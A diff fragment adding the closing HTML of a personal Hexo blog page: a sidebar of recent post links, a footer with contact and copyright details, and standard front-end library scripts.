+            <a class="list-group-item" href="/Ubuntu18%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1Mac%E5%9C%B0%E5%9D%80/2021/09/05/"><i class="fa  fa-book"></i> Ubuntu18修改网卡Mac地址</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/"><i class="fa  fa-book"></i> Ubuntu18使用Aircrack-ng破解WiFi</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E7%AE%97%E6%B3%95/2021/08/22/"><i class="fa  fa-book"></i> 身份证号码算法</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/Linux%E4%B8%8B%E9%80%9A%E8%BF%87%E8%B7%AF%E5%BE%84%E6%9F%A5%E6%89%BE%E4%B8%B2%E5%8F%A3%E5%8F%B7/2021/08/21/"><i class="fa  fa-book"></i> Linux下通过路径查找串口号</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2021/08/19/"><i class="fa  fa-book"></i> 微信小程序开发环境搭建</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:540060348@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/540060348"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 战麟 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by 战麟.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
